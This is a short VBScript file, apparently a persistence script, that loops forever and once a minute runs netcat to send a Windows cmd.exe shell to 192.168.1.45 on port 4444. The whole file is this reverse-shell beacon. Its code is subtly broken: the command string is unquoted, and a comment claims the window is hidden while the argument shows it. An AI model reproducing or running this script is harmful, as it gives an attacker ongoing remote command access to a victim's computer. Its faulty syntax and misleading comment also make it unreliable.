Option Explicit

Dim objShell, intReturn

Set objShell = CreateObject("WScript.Shell")

Do
    intReturn = objShell.Run(nc 192.168.1.45 4444 -e cmd.exe, 1, True) ' Hide the window and wait for command to finish before continuing
    WScript.Sleep 1 * 60 * 1000 ' Convert minutes to milliseconds

Loop While True